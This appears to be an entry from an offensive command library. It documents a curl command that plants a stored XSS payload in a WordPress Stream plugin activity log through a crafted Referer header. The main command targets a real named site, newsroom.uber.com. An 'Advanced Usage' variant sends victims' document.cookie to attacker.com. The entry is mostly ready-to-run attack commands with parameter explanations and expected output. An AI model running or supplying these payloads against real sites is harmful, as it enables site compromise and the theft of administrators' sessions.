---
data: >-
  curl -v -H 'Referer:
  /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e'
  --data 'post-password=foo'
  'https://newsroom.uber.com/wp-login.php?action=postpass'
tags:
  - xss
  - injection
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.211Z'
id: 0f8f5ff5-dd71-45f5-bb24-8b74ee38bbd7
verified: false
validated: true
submitted: true
---
# curl-inject-xss-referer

## Command

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'
```

## Description

This command uses curl to send a POST request to a WordPress wp-login.php endpoint, injecting a stored XSS payload via a crafted Referer header that simulates a redirect from plugin-editor.php, logging the unsanitized 'file' parameter in the Stream plugin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Enables verbose output to show request/response details | Yes |
| `-H 'Referer: ...'` | Sets the Referer header with URL-encoded malicious payload in the 'file' parameter | Yes |
| `--data 'post-password=foo'` | Provides dummy data to trigger the postpass action and redirect logging | Yes |
| URL endpoint | Target wp-login.php with action=postpass | Yes |

## Examples

### Basic Usage

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://target.com/wp-login.php?action=postpass'
```

### Advanced Usage

```bash
curl -v -H 'Referer: /hello?plugin-editor.php&file=aaa%3cscript%3edocument.location=%27http://attacker.com/steal?cookie=%27+document.cookie;%3c/script%3e' --data 'post-password=foo' -k 'https://target.com/wp-login.php?action=postpass'
```

## Expected Output

Verbose curl output showing the POST request, headers, and a 302 Found redirect response. No direct payload execution; success is indicated by the redirect, with the payload stored for later triggering.

## Related

- [[Related Procedure: Inject-Malicious-Payload-into-Stream-Plugin-Activity-Log]]
